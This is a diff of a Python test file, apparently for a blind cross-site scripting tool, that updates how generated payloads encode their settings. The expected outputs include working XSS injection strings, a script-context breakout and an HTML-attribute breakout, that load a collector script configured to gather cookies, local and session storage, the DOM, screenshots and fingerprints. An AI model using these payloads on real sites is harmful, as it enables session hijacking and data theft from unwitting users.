@@ -32,18 +32,8 @@ def test_generate_payload(client):
         to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
         url="http://127.0.0.1",
     )
-    b64_payload = base64.b64encode(
-        str.encode(
-            json.dumps(
-                {
-                    "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
-                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
-                    "tags": [],
-                }
-            )
-        )
-    ).decode()
-    expected_response = f';}};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){{sendData("{b64_payload}")}};document.body.appendChild(js);'
+    b64_payload = base64.b64encode(str.encode(",".join(["r", client_name1.uid, "", ""]))).decode()
+    expected_response = f';}};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.setAttribute("data", "{b64_payload}");document.body.appendChild(js);'
 
     assert rv.get_json()["detail"] == expected_response
     rv = generate_payload(client, access_header, client_id=1)
@@ -66,18 +56,8 @@ def test_generate_payload(client):
         xss_type="r",
         to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
     )
-    b64_payload = base64.b64encode(
-        str.encode(
-            json.dumps(
-                {
-                    "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
-                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
-                    "tags": [],
-                }
-            )
-        )
-    ).decode()
-    expected_response = f'\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("{b64_payload}")</script>'
+    b64_payload = base64.b64encode(str.encode(",".join(["r", client_name1.uid, "", ""]))).decode()
+    expected_response = f'\'>"><script src=http://127.0.0.1/static/collector.min.js data="{b64_payload}"></script>'
     assert rv.get_json()["detail"] == expected_response
     rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="html", xss_type="r")
     expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(client_name1.uid)
